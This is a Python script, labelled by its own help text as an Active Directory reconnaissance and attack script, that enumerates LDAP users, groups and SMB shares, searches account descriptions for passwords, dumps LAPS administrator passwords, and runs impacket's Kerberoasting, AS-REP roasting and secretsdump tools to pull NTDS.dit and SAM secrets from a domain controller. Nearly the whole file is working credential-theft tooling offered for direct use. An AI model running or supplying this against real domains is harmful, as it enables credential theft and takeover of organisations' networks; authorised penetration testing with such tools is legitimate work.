import argparse
import logging
from ldap3 import Server, Connection, ALL, NTLM, ANONYMOUS
from impacket.smbconnection import SMBConnection
import subprocess
import re
import requests
from tabulate import tabulate

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def connect_to_ad(server_address, domain=None, username=None, password=None):
    server = Server(server_address, get_info=ALL)
    if username and password:
        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM)
    else:
        conn = Connection(server, authentication=ANONYMOUS)

    if not conn.bind():
        logging.error(f"Failed to connect to {server_address}. Error: {conn.result['description']}")
        exit()
    
    bind_type = 'authenticated' if username and password else 'anonymous'
    logging.info(f"Successfully connected to {server_address} using {bind_type} bind.")
    return conn

def parse_domain_to_search_base(domain):
    """Convert a domain name like 'example.com' into an LDAP search base like 'dc=example,dc=com'."""
    return ','.join([f'dc={part}' for part in domain.split('.')])

def enumerate_ldap_objects(conn, search_base):
    logging.info(f"Enumerating LDAP objects with search base: {search_base}")

    # Define queries for LDAP enumeration
    queries = {
        'Users': {
            'filter': '(objectClass=user)',
            'attributes': ['sAMAccountName', 'displayName', 'description', 'memberOf', 'userAccountControl']
        },
        'Groups': {
            'filter': '(objectClass=group)',
            'attributes': ['cn', 'description', 'member', 'groupType']
        }
    }

    results = {
        'Users': [],
        'Groups': []
    }

    for key, query in queries.items():
        try:
            conn.search(search_base=search_base, search_filter=query['filter'], attributes=query['attributes'])
            logging.info(f"\n[+] {key}:")

            if key == 'Users':
                for entry in conn.entries:
                    user_data = {
                        'Username': entry.sAMAccountName.value,
                        'Description': entry.description.value if entry.description else '',
                        'MemberOf': ', '.join([group.split(',')[0].split('=')[1] for group in entry.memberOf]) if entry.memberOf else '',
                        'Permissions': 'N/A',  # Placeholder, replace with actual permissions extraction if available
                        'GPO Access': 'N/A'   # Placeholder, replace with GPO access details if available
                    }
                    results['Users'].append(user_data)
                    check_description_for_password(entry)

            elif key == 'Groups':
                for entry in conn.entries:
                    group_data = {
                        'GroupName': entry.cn.value,
                        'Description': entry.description.value if entry.description else '',
                        'Members': ', '.join(entry.member) if entry.member else '',
                        'Permissions': 'N/A',  # Placeholder, replace with actual permissions extraction if available
                        'GPO Access': 'N/A'   # Placeholder, replace with GPO access details if available
                    }
                    results['Groups'].append(group_data)
        except Exception as e:
            logging.error(f"Error enumerating {key}: {e}")

    # Display Users in tabular format
    if results['Users']:
        logging.info("\n[+] Users Information Table:")
        print(tabulate(results['Users'], headers="keys", tablefmt="grid"))

    # Display Groups in tabular format
    if results['Groups']:
        logging.info("\n[+] Groups Information Table:")
        print(tabulate(results['Groups'], headers="keys", tablefmt="grid"))

def check_description_for_password(entry):
    """Check descriptions for potential passwords."""
    password_patterns = re.compile(r'password\s*[:=]\s*(\S+)', re.IGNORECASE)
    description = entry.description.value if entry.description else ''
    matches = password_patterns.findall(description)
    if matches:
        logging.warning(f"Potential password found in description of {entry.entry_dn}: {matches}")

def enumerate_netbios_and_smb(server_address, username=None, password=None, domain=None):
    logging.info("Enumerating NetBIOS and SMB shares...")
    try:
        smb_conn = SMBConnection(server_address, server_address)
        if username and password:
            smb_conn.login(username, password, domain)
        else:
            smb_conn.login('', '')

        logging.info(f"Connected to SMB on {server_address}")

        # Enumerate SMB shares
        shares = smb_conn.listShares()
        logging.info("\n[+] SMB Shares:")
        for share in shares:
            share_name = share['shi1_netname'][:-1]
            logging.info(f"Share Name: {share_name}, Type: {share['shi1_type']}, Comment: {share['shi1_remark']}")
            if share_name not in ['C$', 'ADMIN$', 'IPC$']:
                enumerate_smb_files(smb_conn, share_name)

        # Enumerate NetBIOS names
        netbios_names = smb_conn.getServerName()
        logging.info(f"\n[+] NetBIOS Names: {netbios_names}")

        # Check access to common shares
        logging.info("\n[+] Checking Access to Common Shares:")
        common_shares = ['C$', 'ADMIN$', 'IPC$', 'SYSVOL', 'NETLOGON']
        for share in common_shares:
            try:
                smb_conn.listPath(share, '*')
                logging.info(f"Access to {share}: Allowed")
                if share == 'SYSVOL':
                    enumerate_sysvol_gpo_scripts(smb_conn)
            except Exception as e:
                logging.info(f"Access to {share}: Denied ({e})")

    except Exception as e:
        logging.error(f"Error enumerating NetBIOS/SMB shares: {e}")

def enumerate_smb_files(smb_conn, share_name):
    try:
        logging.info(f"Enumerating files in share {share_name}:")
        files = smb_conn.listPath(share_name, '*')
        for file in files:
            if file.isDirectory:
                logging.info(f"Directory: {file.get_longname()}")
            else:
                logging.info(f"File: {file.get_longname()}")
    except Exception as e:
        logging.error(f"Could not enumerate files in {share_name}: {e}")

def enumerate_sysvol_gpo_scripts(smb_conn):
    try:
        logging.info("\n[+] Enumerating GPO scripts in SYSVOL share...")
        sysvol_path = '\\\\' + smb_conn.getRemoteHost() + '\\SYSVOL'
        smb_conn.listPath(sysvol_path, '*')

        gpo_path = sysvol_path + '\\Policies'
        gpo_files = smb_conn.listPath(gpo_path, '*')

        for file in gpo_files:
            if file.isDirectory:
                gpo_scripts_path = gpo_path + '\\' + file.get_longname() + '\\Machine\\Scripts\\Startup'
                try:
                    scripts = smb_conn.listPath(gpo_scripts_path, '*')
                    logging.info(f"Enumerating Startup Scripts in {gpo_scripts_path}:")
                    for script in scripts:
                        logging.info(f"Script: {script.get_longname()}")
                except Exception as e:
                    logging.info(f"No Startup Scripts found in {gpo_scripts_path} or access denied: {e}")

                user_scripts_path = gpo_path + '\\' + file.get_longname() + '\\User\\Scripts\\Logon'
                try:
                    scripts = smb_conn.listPath(user_scripts_path, '*')
                    logging.info(f"Enumerating Logon Scripts in {user_scripts_path}:")
                    for script in scripts:
                        logging.info(f"Script: {script.get_longname()}")
                except Exception as e:
                    logging.info(f"No Logon Scripts found in {user_scripts_path} or access denied: {e}")

    except Exception as e:
        logging.error(f"Error enumerating SYSVOL GPO scripts: {e}")

def run_command(command):
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        logging.error(f"Command failed: {e}")
        return None

def kerberoasting(target, domain, username, password):
    logging.info("Performing Kerberoasting...")
    command = ['python3', 'GetUserSPNs.py', f'{domain}/{username}:{password}', '-dc-ip', target, '-request']
    result = run_command(command)
    if result:
        logging.info(result)

def asrep_roasting(target, domain, username):
    logging.info("Performing AS-REP Roasting...")
    command = ['python3', 'GetNPUsers.py', f'{domain}/', '-no-pass', '-usersfile', username, '-dc-ip', target]
    result = run_command(command)
    if result:
        logging.info(result)

def dump_secrets(server_address, username, password, domain):
    logging.info("Dumping Secrets (NTDS.dit, SAM)...")
    command = ['python3', 'secretsdump.py', f'{domain}/{username}:{password}@{server_address}']
    result = run_command(command)
    if result:
        logging.info(result)

def dump_laps_passwords(conn, search_base):
    logging.info("\n[+] Dumping LAPS Passwords...")
    try:
        conn.search(
            search_base=search_base,
            search_filter='(&(objectClass=computer)(ms-MCS-AdmPwd=*))',
            attributes=['sAMAccountName', 'ms-MCS-AdmPwd', 'ms-MCS-AdmPwdExpirationTime']
        )
        if conn.entries:
            logging.info("[+] LAPS Passwords:")
            for entry in conn.entries:
                logging.info(f"Computer: {entry.sAMAccountName}, Password: {entry['ms-MCS-AdmPwd']}, Expiration: {entry['ms-MCS-AdmPwdExpirationTime']}")
        else:
            logging.info("No LAPS passwords found or insufficient permissions.")
    except Exception as e:
        logging.error(f"Error dumping LAPS passwords: {e}")

def check_webdav_exploitability(server_address):
    logging.info("\n[+] Checking WebDAV Exploitability...")
    try:
        url = f"http://{server_address}/"
        response = requests.options(url)
        
        if 'DAV' in response.headers.get('allow', ''):
            logging.info(f"WebDAV is enabled on {server_address}")
            if 'PROPFIND' in response.headers.get('allow', '') and 'MKCOL' in response.headers.get('allow', ''):
                logging.warning("WebDAV is potentially exploitable! PROPFIND and MKCOL are allowed.")
            else:
                logging.info("WebDAV is enabled but may not be fully exploitable.")
        else:
            logging.info("WebDAV is not enabled on the server.")

    except Exception as e:
        logging.error(f"Error checking WebDAV exploitability: {e}")

def main():
    parser = argparse.ArgumentParser(description="Comprehensive Active Directory Reconnaissance and Attack Script")
    parser.add_argument('--server', required=True, help='LDAP/DC server address')
    parser.add_argument('--username', help='Username for LDAP/SMB bind (optional for anonymous)')
    parser.add_argument('--password', help='Password for LDAP/SMB bind (optional for anonymous)')
    parser.add_argument('--domain', required=True, help='Domain for LDAP/SMB bind in format like example.com')
    parser.add_argument('--kerberoast', action='store_true', help='Perform Kerberoasting')
    parser.add_argument('--asrep', help='Perform AS-REP Roasting with specified user file')
    parser.add_argument('--dump', action='store_true', help='Dump secrets using secretsdump')
    parser.add_argument('--laps', action='store_true', help='Dump LAPS passwords')
    parser.add_argument('--webdav', action='store_true', help='Check WebDAV exploitability')
    args = parser.parse_args()

    if args.username and not args.password:
        logging.error("Password must be provided if username is specified.")
        exit()

    # Parse domain to search base
    search_base = parse_domain_to_search_base(args.domain)

    # Connect to AD and perform LDAP enumeration
    conn = connect_to_ad(args.server, args.domain, args.username, args.password)
    enumerate_ldap_objects(conn, search_base)

    # Dump LAPS passwords if specified
    if args.laps:
        dump_laps_passwords(conn, search_base)

    conn.unbind()

    # Enumerate NetBIOS and SMB shares
    enumerate_netbios_and_smb(args.server, args.username, args.password, args.domain)

    # Perform Kerberoasting if specified
    if args.kerberoast:
        kerberoasting(args.server, args.domain, args.username, args.password)

    # Perform AS-REP Roasting if specified
    if args.asrep:
        asrep_roasting(args.server, args.domain, args.asrep)

    # Dump secrets if specified
    if args.dump:
        dump_secrets(args.server, args.username, args.password, args.domain)

    # Check WebDAV exploitability if specified
    if args.webdav:
        check_webdav_exploitability(args.server)

if __name__ == "__main__":
    main()
